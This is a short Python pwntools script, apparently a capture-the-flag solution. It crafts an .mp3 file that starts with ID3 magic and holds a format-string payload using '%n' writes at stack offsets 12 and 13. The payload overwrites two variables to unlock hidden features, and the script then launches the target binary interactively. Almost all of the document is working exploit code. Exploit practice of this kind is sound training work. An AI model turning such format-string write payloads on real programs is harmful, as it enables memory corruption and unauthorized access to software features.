#!/usr/bin/env python3

from pwn import *
import os

context.log_level = 'error'
context.terminal = ['alacritty', '-e']

"""
Goal is to generate a .mp3 file with ID3 magic at the start
and a format string payload able to overwrite var1 and var2
granting us access to beta functionalities.

There are 2 addresses of the variables on the stack which we can write to
"""


# first stack pointer at 12
# second stack pointer at 13
value1 = 0xbeef
value2 = 0xc0de
payload = f"ID3%{value1}x%12$n%{value2-value1}x%13$n"

# Save to file
with open("/tmp/test.mp3", "w") as out:
    out.write(payload)


print("[+] Payload saved to /tmp/test.mp3")

os.chdir("./challenge/")

print("[+] Running binary : ")
print("==================================")

io = process('./main')
io.interactive()
io.close()

print("==================================")

